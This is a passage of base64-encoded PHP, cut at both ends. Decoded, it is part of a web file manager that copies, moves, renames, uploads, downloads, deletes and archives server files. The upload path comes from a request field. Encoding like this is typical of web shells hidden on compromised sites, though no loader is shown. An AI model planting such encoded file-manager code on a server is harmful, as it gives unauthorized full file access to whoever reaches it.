lczwvYj4gYWxyZWFkeSBleGlzdHMnLCBmbV9lbmMoJG5ldykpLCAnYWxlcnQnKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmIChmbV9ta2RpcigkcGF0aCAuICcvJyAuICRuZXcsIGZhbHNlKSA9PT0gdHJ1ZSkgewogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnRm9sZGVyJykuJyA8Yj4lczwvYj4gJy5sbmcoJ0NyZWF0ZWQnKSwgJG5ldykpOwogICAgICAgICAgICB9IGVsc2VpZiAoZm1fbWtkaXIoJHBhdGggLiAnLycgLiAkbmV3LCBmYWxzZSkgPT09ICRwYXRoIC4gJy8nIC4gJG5ldykgewogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKCdGb2xkZXIgPGI+JXM8L2I+IGFscmVhZHkgZXhpc3RzJywgZm1fZW5jKCRuZXcpKSwgJ2FsZXJ0Jyk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYoJ0ZvbGRlciA8Yj4lczwvYj4gbm90IGNyZWF0ZWQnLCBmbV9lbmMoJG5ldykpLCAnZXJyb3InKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgZm1fc2V0X21zZygnSW52YWxpZCBjaGFyYWN0ZXJzIGluIGZpbGUgb3IgZm9sZGVyIG5hbWUnLCAnZXJyb3InKTsKICAgIH0KICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOwp9CgovLyBDb3B5IGZvbGRlciAvIGZpbGUKaWYgKGlzc2V0KCRfR0VUWydjb3B5J10sICRfR0VUWydmaW5pc2gnXSkgJiYgIUZNX1JFQURPTkxZKSB7CiAgICAvLyBmcm9tCiAgICAkY29weSA9ICRfR0VUWydjb3B5J107CiAgICAkY29weSA9IGZtX2NsZWFuX3BhdGgoJGNvcHkpOwogICAgLy8gZW1wdHkgcGF0aAogICAgaWYgKCRjb3B5ID09ICcnKSB7CiAgICAgICAgZm1fc2V0X21zZygnU291cmNlIHBhdGggbm90IGRlZmluZWQnLCAnZXJyb3InKTsKICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKICAgIH0KICAgIC8vIGFicyBwYXRoIGZyb20KICAgICRmcm9tID0gRk1fUk9PVF9QQVRIIC4gJy8nIC4gJGNvcHk7CiAgICAvLyBhYnMgcGF0aCB0bwogICAgJGRlc3QgPSBGTV9ST09UX1BBVEg7CiAgICBpZiAoRk1fUEFUSCAhPSAnJykgewogICAgICAgICRkZXN0IC49ICcvJyAuIEZNX1BBVEg7CiAgICB9CiAgICAkZGVzdCAuPSAnLycgLiBiYXNlbmFtZSgkZnJvbSk7CiAgICAvLyBtb3ZlPwogICAgJG1vdmUgPSBpc3NldCgkX0dFVFsnbW92ZSddKTsKICAgIC8vIGNvcHkvbW92ZS9kdXBsaWNhdGUKICAgIGlmICgkZnJvbSAhPSAkZGVzdCkgewogICAgICAgICRtc2dfZnJvbSA9IHRyaW0oRk1fUEFUSCAuICcvJyAuIGJhc2VuYW1lKCRmcm9tKSwgJy8nKTsKICAgICAgICBpZiAoJG1vdmUpIHsgLy8gTW92ZSBhbmQgdG8gIT0gZnJvbSBzbyBqdXN0IHBlcmZvcm0gbW92ZQogICAgICAgICAgICAkcmVuYW1lID0gZm1fcmVuYW1lKCRmcm9tLCAkZGVzdCk7CiAgICAgICAgICAgIGlmICgkcmVuYW1lKSB7CiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYoJ01vdmVkIGZyb20gPGI+JXM8L2I+IHRvIDxiPiVzPC9iPicsIGZtX2VuYygkY29weSksIGZtX2VuYygkbXNnX2Zyb20pKSk7CiAgICAgICAgICAgIH0gZWxzZWlmICgkcmVuYW1lID09PSBudWxsKSB7CiAgICAgICAgICAgICAgICBmbV9zZXRfbXNnKCdGaWxlIG9yIGZvbGRlciB3aXRoIHRoaXMgcGF0aCBhbHJlYWR5IGV4aXN0cycsICdhbGVydCcpOwoKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZignRXJyb3Igd2hpbGUgbW92aW5nIGZyb20gPGI+JXM8L2I+IHRvIDxiPiVzPC9iPicsIGZtX2VuYygkY29weSksIGZtX2VuYygkbXNnX2Zyb20pKSwgJ2Vycm9yJyk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgeyAvLyBOb3QgbW92ZSBhbmQgdG8gIT0gZnJvbSBzbyBjb3B5IHdpdGggb3JpZ2luYWwgbmFtZQogICAgICAgICAgICBpZiAoZm1fcmNvcHkoJGZyb20sICRkZXN0KSkgewogICAgICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKCdDb3BpZWQgZnJvbSA8Yj4lczwvYj4gdG8gPGI+JXM8L2I+JywgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZignRXJyb3Igd2hpbGUgY29weWluZyBmcm9tIDxiPiVzPC9iPiB0byA8Yj4lczwvYj4nLCBmbV9lbmMoJGNvcHkpLCBmbV9lbmMoJG1zZ19mcm9tKSksICdlcnJvcicpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgIGlmICghJG1vdmUpeyAvL05vdCBtb3ZlIGFuZCB0byA9IGZyb20gc28gZHVwbGljYXRlCiAgICAgICAgICAgICRtc2dfZnJvbSA9IHRyaW0oRk1fUEFUSCAuICcvJyAuIGJhc2VuYW1lKCRmcm9tKSwgJy8nKTsKICAgICAgICAgICAgJGZuX3BhcnRzID0gcGF0aGluZm8oJGZyb20pOwogICAgICAgICAgICAkZXh0ZW5zaW9uX3N1ZmZpeCA9ICcnOwogICAgICAgICAgICBpZighaXNfZGlyKCRmcm9tKSl7CiAgICAgICAgICAgICAgICRleHRlbnNpb25fc3VmZml4ID0gJy4nLiRmbl9wYXJ0c1snZXh0ZW5zaW9uJ107CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy9DcmVhdGUgbmV3IG5hbWUgZm9yIGR1cGxpY2F0ZQogICAgICAgICAgICAkZm5fZHVwbGljYXRlID0gJGZuX3BhcnRzWydkaXJuYW1lJ10uJy8nLiRmbl9wYXJ0c1snZmlsZW5hbWUnXS4nLScuZGF0ZSgnWW1kSGlzJykuJGV4dGVuc2lvbl9zdWZmaXg7CiAgICAgICAgICAgICRsb29wX2NvdW50ID0gMDsKICAgICAgICAgICAgJG1heF9sb29wID0gMTAwMDsKICAgICAgICAgICAgLy8gQ2hlY2sgaWYgYSBmaWxlIHdpdGggdGhlIGR1cGxpY2F0ZSBuYW1lIGFscmVhZHkgZXhpc3RzLCBpZiBzbywgbWFrZSBuZXcgbmFtZSAoZWRnZSBjYXNlLi4uKQogICAgICAgICAgICB3aGlsZShmaWxlX2V4aXN0cygkZm5fZHVwbGljYXRlKSAmICRsb29wX2NvdW50IDwgJG1heF9sb29wKXsKICAgICAgICAgICAgICAgJGZuX3BhcnRzID0gcGF0aGluZm8oJGZuX2R1cGxpY2F0ZSk7CiAgICAgICAgICAgICAgICRmbl9kdXBsaWNhdGUgPSAkZm5fcGFydHNbJ2Rpcm5hbWUnXS4nLycuJGZuX3BhcnRzWydmaWxlbmFtZSddLictY29weScuJGV4dGVuc2lvbl9zdWZmaXg7CiAgICAgICAgICAgICAgICRsb29wX2NvdW50Kys7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGZtX3Jjb3B5KCRmcm9tLCAkZm5fZHVwbGljYXRlLCBGYWxzZSkpIHsKICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZignQ29weWllZCBmcm9tIDxiPiVzPC9iPiB0byA8Yj4lczwvYj4nLCBmbV9lbmMoJGNvcHkpLCBmbV9lbmMoJGZuX2R1cGxpY2F0ZSkpKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZignRXJyb3Igd2hpbGUgY29weWluZyBmcm9tIDxiPiVzPC9iPiB0byA8Yj4lczwvYj4nLCBmbV9lbmMoJGNvcHkpLCBmbV9lbmMoJGZuX2R1cGxpY2F0ZSkpLCAnZXJyb3InKTsKICAgICAgICAgICAgfQogICAgICAgfQogICAgICAgZWxzZXsKICAgICAgICAgICBmbV9zZXRfbXNnKCdQYXRocyBtdXN0IGJlIG5vdCBlcXVhbCcsICdhbGVydCcpOwogICAgICAgfQogICAgfQogICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZShGTV9QQVRIKSk7Cn0KCi8vIE1hc3MgY29weSBmaWxlcy8gZm9sZGVycwppZiAoaXNzZXQoJF9QT1NUWydmaWxlJ10sICRfUE9TVFsnY29weV90byddLCAkX1BPU1RbJ2ZpbmlzaCddKSAmJiAhRk1fUkVBRE9OTFkpIHsKICAgIC8vIGZyb20KICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOwogICAgaWYgKEZNX1BBVEggIT0gJycpIHsKICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOwogICAgfQogICAgLy8gdG8KICAgICRjb3B5X3RvX3BhdGggPSBGTV9ST09UX1BBVEg7CiAgICAkY29weV90byA9IGZtX2NsZWFuX3BhdGgoJF9QT1NUWydjb3B5X3RvJ10pOwogICAgaWYgKCRjb3B5X3RvICE9ICcnKSB7CiAgICAgICAgJGNvcHlfdG9fcGF0aCAuPSAnLycgLiAkY29weV90bzsKICAgIH0KICAgIGlmICgkcGF0aCA9PSAkY29weV90b19wYXRoKSB7CiAgICAgICAgZm1fc2V0X21zZygnUGF0aHMgbXVzdCBiZSBub3QgZXF1YWwnLCAnYWxlcnQnKTsKICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKICAgIH0KICAgIGlmICghaXNfZGlyKCRjb3B5X3RvX3BhdGgpKSB7CiAgICAgICAgaWYgKCFmbV9ta2RpcigkY29weV90b19wYXRoLCB0cnVlKSkgewogICAgICAgICAgICBmbV9zZXRfbXNnKCdVbmFibGUgdG8gY3JlYXRlIGRlc3RpbmF0aW9uIGZvbGRlcicsICdlcnJvcicpOwogICAgICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKICAgICAgICB9CiAgICB9CiAgICAvLyBtb3ZlPwogICAgJG1vdmUgPSBpc3NldCgkX1BPU1RbJ21vdmUnXSk7CiAgICAvLyBjb3B5L21vdmUKICAgICRlcnJvcnMgPSAwOwogICAgJGZpbGVzID0gJF9QT1NUWydmaWxlJ107CiAgICBpZiAoaXNfYXJyYXkoJGZpbGVzKSAmJiBjb3VudCgkZmlsZXMpKSB7CiAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmKSB7CiAgICAgICAgICAgIGlmICgkZiAhPSAnJykgewogICAgICAgICAgICAgICAgLy8gYWJzIHBhdGggZnJvbQogICAgICAgICAgICAgICAgJGZyb20gPSAkcGF0aCAuICcvJyAuICRmOwogICAgICAgICAgICAgICAgLy8gYWJzIHBhdGggdG8KICAgICAgICAgICAgICAgICRkZXN0ID0gJGNvcHlfdG9fcGF0aCAuICcvJyAuICRmOwogICAgICAgICAgICAgICAgLy8gZG8KICAgICAgICAgICAgICAgIGlmICgkbW92ZSkgewogICAgICAgICAgICAgICAgICAgICRyZW5hbWUgPSBmbV9yZW5hbWUoJGZyb20sICRkZXN0KTsKICAgICAgICAgICAgICAgICAgICBpZiAoJHJlbmFtZSA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGVycm9ycysrOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFmbV9yY29weSgkZnJvbSwgJGRlc3QpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRlcnJvcnMrKzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRlcnJvcnMgPT0gMCkgewogICAgICAgICAgICAkbXNnID0gJG1vdmUgPyAnU2VsZWN0ZWQgZmlsZXMgYW5kIGZvbGRlcnMgbW92ZWQnIDogJ1NlbGVjdGVkIGZpbGVzIGFuZCBmb2xkZXJzIGNvcGllZCc7CiAgICAgICAgICAgIGZtX3NldF9tc2coJG1zZyk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJG1zZyA9ICRtb3ZlID8gJ0Vycm9yIHdoaWxlIG1vdmluZyBpdGVtcycgOiAnRXJyb3Igd2hpbGUgY29weWluZyBpdGVtcyc7CiAgICAgICAgICAgIGZtX3NldF9tc2coJG1zZywgJ2Vycm9yJyk7CiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBmbV9zZXRfbXNnKCdOb3RoaW5nIHNlbGVjdGVkJywgJ2FsZXJ0Jyk7CiAgICB9CiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKfQoKLy8gUmVuYW1lCmlmIChpc3NldCgkX0dFVFsncmVuJ10sICRfR0VUWyd0byddKSAmJiAhRk1fUkVBRE9OTFkpIHsKICAgIC8vIG9sZCBuYW1lCiAgICAkb2xkID0gJF9HRVRbJ3JlbiddOwogICAgJG9sZCA9IGZtX2NsZWFuX3BhdGgoJG9sZCk7CiAgICAkb2xkID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJG9sZCk7CiAgICAvLyBuZXcgbmFtZQogICAgJG5ldyA9ICRfR0VUWyd0byddOwogICAgJG5ldyA9IGZtX2NsZWFuX3BhdGgoc3RyaXBfdGFncygkbmV3KSk7CiAgICAkbmV3ID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJG5ldyk7CiAgICAvLyBwYXRoCiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsKICAgIGlmIChGTV9QQVRIICE9ICcnKSB7CiAgICAgICAgJHBhdGggLj0gJy8nIC4gRk1fUEFUSDsKICAgIH0KICAgIC8vIHJlbmFtZQogICAgaWYgKGZtX2lzdmFsaWRfZmlsZW5hbWUoJG5ldykgJiYgJG9sZCAhPSAnJyAmJiAkbmV3ICE9ICcnKSB7CiAgICAgICAgaWYgKGZtX3JlbmFtZSgkcGF0aCAuICcvJyAuICRvbGQsICRwYXRoIC4gJy8nIC4gJG5ldykpIHsKICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKCdSZW5hbWVkIGZyb20gPGI+JXM8L2I+IHRvIDxiPiVzPC9iPicsIGZtX2VuYygkb2xkKSwgZm1fZW5jKCRuZXcpKSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKCdFcnJvciB3aGlsZSByZW5hbWluZyBmcm9tIDxiPiVzPC9iPiB0byA8Yj4lczwvYj4nLCBmbV9lbmMoJG9sZCksIGZtX2VuYygkbmV3KSksICdlcnJvcicpOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgZm1fc2V0X21zZygnSW52YWxpZCBjaGFyYWN0ZXJzIGluIGZpbGUgbmFtZScsICdlcnJvcicpOwogICAgfQogICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZShGTV9QQVRIKSk7Cn0KCi8vIERvd25sb2FkCmlmIChpc3NldCgkX0dFVFsnZGwnXSkpIHsKICAgICRkbCA9ICRfR0VUWydkbCddOwogICAgJGRsID0gZm1fY2xlYW5fcGF0aCgkZGwpOwogICAgJGRsID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGRsKTsKICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOwogICAgaWYgKEZNX1BBVEggIT0gJycpIHsKICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOwogICAgfQogICAgaWYgKCRkbCAhPSAnJyAmJiBpc19maWxlKCRwYXRoIC4gJy8nIC4gJGRsKSkgewogICAgICAgIGZtX2Rvd25sb2FkX2ZpbGUoJHBhdGggLiAnLycgLiAkZGwsICRkbCwgMTAyNCk7CiAgICAgICAgZXhpdDsKICAgIH0gZWxzZSB7CiAgICAgICAgZm1fc2V0X21zZygnRmlsZSBub3QgZm91bmQnLCAnZXJyb3InKTsKICAgICAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKICAgIH0KfQoKLy8gVXBsb2FkCmlmICghZW1wdHkoJF9GSUxFUykgJiYgIUZNX1JFQURPTkxZKSB7CiAgICAkb3ZlcnJpZGVfZmlsZV9uYW1lID0gZmFsc2U7CiAgICAkZiA9ICRfRklMRVM7CiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsKICAgICRkcyA9IERJUkVDVE9SWV9TRVBBUkFUT1I7CiAgICBpZiAoRk1fUEFUSCAhPSAnJykgewogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7CiAgICB9CgogICAgJGVycm9ycyA9IDA7CiAgICAkdXBsb2FkcyA9IDA7CiAgICAkYWxsb3dlZCA9IChGTV9VUExPQURfRVhURU5TSU9OKSA/IGV4cGxvZGUoJywnLCBGTV9VUExPQURfRVhURU5TSU9OKSA6IGZhbHNlOwogICAgJHJlc3BvbnNlID0gYXJyYXkgKAogICAgICAgICdzdGF0dXMnID0+ICdlcnJvcicsCiAgICAgICAgJ2luZm8nICAgPT4gJ09vcHMhIFRyeSBhZ2FpbicKICAgICk7CgogICAgJGZpbGVuYW1lID0gJGZbJ2ZpbGUnXVsnbmFtZSddOwogICAgJHRtcF9uYW1lID0gJGZbJ2ZpbGUnXVsndG1wX25hbWUnXTsKICAgICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSk7CiAgICAkaXNGaWxlQWxsb3dlZCA9ICgkYWxsb3dlZCkgPyBpbl9hcnJheSgkZXh0LCAkYWxsb3dlZCkgOiB0cnVlOwoKICAgICR0YXJnZXRQYXRoID0gJHBhdGggLiAkZHM7CiAgICBpZiAoIGlzX3dyaXRhYmxlKCR0YXJnZXRQYXRoKSApIHsKICAgICAgICAkZnVsbFBhdGggPSAkcGF0aCAuICcvJyAuICRfUkVRVUVTVFsnZnVsbHBhdGgnXTsKICAgICAgICAkZm9sZGVyID0gc3Vic3RyKCRmdWxsUGF0aCwgMCwgc3RycnBvcygkZnVsbFBhdGgsICIvIikpOwoKICAgICAgICBpZihmaWxlX2V4aXN0cyAoJGZ1bGxQYXRoKSAmJiAhJG92ZXJyaWRlX2ZpbGVfbmFtZSkgewogICAgICAgICAgICAkZXh0XzEgPSAkZXh0ID8gJy4nLiRleHQgOiAnJzsKICAgICAgICAgICAgJGZ1bGxQYXRoID0gc3RyX3JlcGxhY2UoJGV4dF8xLCAnJywgJGZ1bGxQYXRoKSAuJ18nLiBkYXRlKCd5bWRIaXMnKS4gJGV4dF8xOwogICAgICAgIH0KCiAgICAgICAgaWYgKCFpc19kaXIoJGZvbGRlcikpIHsKICAgICAgICAgICAgJG9sZCA9IHVtYXNrKDApOwogICAgICAgICAgICBta2RpcigkZm9sZGVyLCAwNzc3LCB0cnVlKTsKICAgICAgICAgICAgdW1hc2soJG9sZCk7CiAgICAgICAgfQoKICAgICAgICBpZiAoZW1wdHkoJGZbJ2ZpbGUnXVsnZXJyb3InXSkgJiYgIWVtcHR5KCR0bXBfbmFtZSkgJiYgJHRtcF9uYW1lICE9ICdub25lJyAmJiAkaXNGaWxlQWxsb3dlZCkgewogICAgICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCR0bXBfbmFtZSwgJGZ1bGxQYXRoKSkgewogICAgICAgICAgICAgICAgLy8gQmUgc3VyZSB0aGF0IHRoZSBmaWxlIGhhcyBiZWVuIHVwbG9hZGVkCiAgICAgICAgICAgICAgICBpZiAoIGZpbGVfZXhpc3RzKCRmdWxsUGF0aCkgKSB7CiAgICAgICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkgKAogICAgICAgICAgICAgICAgICAgICAgICAnc3RhdHVzJyAgICA9PiAnc3VjY2VzcycsCiAgICAgICAgICAgICAgICAgICAgICAgICdpbmZvJyA9PiAiZmlsZSB1cGxvYWQgc3VjY2Vzc2Z1bCIKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBhcnJheSAoCiAgICAgICAgICAgICAgICAgICAgICAgICdzdGF0dXMnID0+ICdlcnJvcicsCiAgICAgICAgICAgICAgICAgICAgICAgICdpbmZvJyAgID0+ICdDb3VsZG5cJ3QgdXBsb2FkIHRoZSByZXF1ZXN0ZWQgZmlsZS4nCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGFycmF5ICgKICAgICAgICAgICAgICAgICAgICAnc3RhdHVzJyAgICA9PiAnZXJyb3InLAogICAgICAgICAgICAgICAgICAgICdpbmZvJyAgICAgID0+ICJFcnJvciB3aGlsZSB1cGxvYWRpbmcgZmlsZXMuIFVwbG9hZGVkIGZpbGVzICR1cGxvYWRzIiwKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgICRyZXNwb25zZSA9IGFycmF5ICgKICAgICAgICAgICAgJ3N0YXR1cycgPT4gJ2Vycm9yJywKICAgICAgICAgICAgJ2luZm8nICAgPT4gJ1RoZSBzcGVjaWZpZWQgZm9sZGVyIGZvciB1cGxvYWQgaXNuXCd0IHdyaXRlYWJsZS4nCiAgICAgICAgKTsKICAgIH0KICAgIC8vIFJldHVybiB0aGUgcmVzcG9uc2UKICAgIGVjaG8ganNvbl9lbmNvZGUoJHJlc3BvbnNlKTsKICAgIGV4aXQoKTsKfQoKLy8gTWFzcyBkZWxldGluZwppZiAoaXNzZXQoJF9QT1NUWydncm91cCddLCAkX1BPU1RbJ2RlbGV0ZSddKSAmJiAhRk1fUkVBRE9OTFkpIHsKICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOwogICAgaWYgKEZNX1BBVEggIT0gJycpIHsKICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOwogICAgfQoKICAgICRlcnJvcnMgPSAwOwogICAgJGZpbGVzID0gJF9QT1NUWydmaWxlJ107CiAgICBpZiAoaXNfYXJyYXkoJGZpbGVzKSAmJiBjb3VudCgkZmlsZXMpKSB7CiAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmKSB7CiAgICAgICAgICAgIGlmICgkZiAhPSAnJykgewogICAgICAgICAgICAgICAgJG5ld19wYXRoID0gJHBhdGggLiAnLycgLiAkZjsKICAgICAgICAgICAgICAgIGlmICghZm1fcmRlbGV0ZSgkbmV3X3BhdGgpKSB7CiAgICAgICAgICAgICAgICAgICAgJGVycm9ycysrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkZXJyb3JzID09IDApIHsKICAgICAgICAgICAgZm1fc2V0X21zZygnU2VsZWN0ZWQgZmlsZXMgYW5kIGZvbGRlciBkZWxldGVkJyk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZm1fc2V0X21zZygnRXJyb3Igd2hpbGUgZGVsZXRpbmcgaXRlbXMnLCAnZXJyb3InKTsKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIGZtX3NldF9tc2coJ05vdGhpbmcgc2VsZWN0ZWQnLCAnYWxlcnQnKTsKICAgIH0KCiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsKfQoKLy8gUGFjayBmaWxlcwppZiAoaXNzZXQoJF9QT1NUWydncm91cCddKSAmJiAoaXNzZXQoJF9QT1NUWyd6aXAnXSkgfHwgaXNzZXQoJF9QT1NUWyd0YXInXSkpICYmICFGTV9SRUFET05MWSkgewogICAgJHBhdGggPSBGTV9ST09UX1BBVEg7CiAgICAkZXh0ID0gJ3ppcCc7CiAgICBpZiAoRk1fUEFUSCAhPSAnJykgewogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7CiAgICB9CgogICAgLy9zZXQgcGFjayB0eXBlCiAgICAkZXh0ID0gaXNzZXQoJF9QT1NUWyd0YXInXSkgPyAndGFyJyA6ICd6aXAnOwoKCiAgICBpZiAoKCRleHQgPT0gInppcCIgJiYgIWNsYXNzX2V4aXN0cygnWmlwQXJjaGl2ZScpKSB8fCAoJGV4dCA9PSAidGFyIiAmJiAhY2xhc3NfZXhpc3RzKCdQaGFyRGF0YScpKSkgewogICAgICAgIGZtX3NldF9tc2coJ09wZXJhdGlvbnMgd2l0aCBhcmNoaXZlcyBhcmUgbm90IGF2YWlsYWJsZScsICdlcnJvcicpOwogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOwogICAgfQoKICAgICRmaWxlcyA9ICRfUE9TVFsnZmlsZSddOwogICAgaWYgKCFlbXB0eSgkZmlsZXMpKSB7CiAgICAgICAgY2hkaXIoJHBhdGgpOwoKICAgICAgICBpZiAoY291bnQoJGZpbGVzKSA9PSAxKSB7CiAgICAgICAgICAgICRvbmVfZmlsZSA9IHJlc2V0KCRmaWxlcyk7CiAgICAgICAgICAgICRvbmVfZmlsZSA9IGJhc2VuYW1lKCRvbmVfZmlsZSk7CiAgICAgICAgICAgICR6aXBuYW1lID0gJG9uZV9maWxlIC4gJ18nIC4gZGF0ZSgneW1kX0hpcycpIC4gJy4nLiRleHQ7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHppcG5hbWUgPSAnYXJjaGl2ZV8nIC4gZGF0ZSgneW1kX0hpcycpIC4gJy4nLiRleHQ7CiAgICAgICAgfQoKICAgICAgICBpZigkZXh0ID09ICd6aXAnKSB7CiAgICAgICAgICAgICR6aXBwZXIgPSBuZXcgRk1fWmlwcGVyKCk7CiAgICAgICAgICAgICRyZXMgPSAkemlwcGVyLT5jcmVhdGUoJHppcG5hbWUsICRmaWxlcyk7CiAgICAgICAgfSBlbHNlaWYgKCRleHQgPT0gJ3RhcicpIHsKICAgICAgICAgICAgJHRhciA9IG5ldyBGTV9aaXBwZXJfVGFyKCk7CiAgICAgICAgICAgICRyZXMgPSAkdGFyLT5jcmVhdGUoJHppcG5hbWUsICRmaWxlcyk7CiAgICAgICAgfQoKICAgICAgICBpZiAoJHJlcykgewogICAgICAgICAgICBmbV9zZXRfbXNnKHNwcmludGYoJ0FyY2hpdmUgPGI+JXM8L2I+IGNyZWF0ZWQnLCBmbV9lbmMoJHppcG5hbWUpKSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZm1fc2V0X21zZygnQXJjaGl2ZSBub3QgY3JlYXRlZCcsICdlcnJvcicpOwogICAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgICAgZm1fc2V0X21zZygnTm90aGluZyBzZWxlY3RlZCcsICdhbGVydCcpOwogICAgfQoKICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOwp9CgovLyBVbnBhY2sKaWYgKGlzc2V0KCRfR0VUWyd1bnppcCddKSAmJiAhRk1fUkVBRE9OTFkpIHsKICAgICR1bnppcCA9ICRfR0VUWyd1bnppcCddOwogICAgJHVuemlwID0gZm1fY2xlYW5fcGF0aCgkdW56aXApOwogICAgJHVuemlwID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJHVuemlwKTsKICAgICRpc1ZhbGlkID0gZmFsc2U7CgogICAgJHBhdGggPSBGTV9ST09UX1BBVEg7CiAgICBpZiAoRk1fUEFUSCAhPSAnJykgewogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7CiAgICB9CgogICAgaWYgKCR1bnppcCAhPSAnJyAmJiBpc19maWxlKCRwYXRoIC4gJy8nIC4gJHVuemlwKSkgewogICAgICAgICR6aXBfcGF0aCA9ICRwYXRoIC4gJy8nIC4gJHVuemlwOwogICAgICAgICRleHQgPSBwYXRoaW5mbygkemlwX3BhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTik7CiAgICAgICAgJGlzVmFsaWQgPSB0cnVlOwogICAgfSBlbHNlIHsKICAgICAgICBmbV9zZXRfbXNnKCdGaWxlIG5vdCBmb3VuZCcsICdlcnJvcicpOwogICAgfQoKCiAgICBpZiAoKCRleHQgPT0gInppcCIgJiYgIWNsYXNzX2V4aXN0cygnWmlwQXJjaGl2ZScpKSB8fCAoJGV4dCA9PSAidGFyIiAmJiAhY2xhc3NfZXhpc3RzKCdQaGFyRGF0YScpKSkgewogI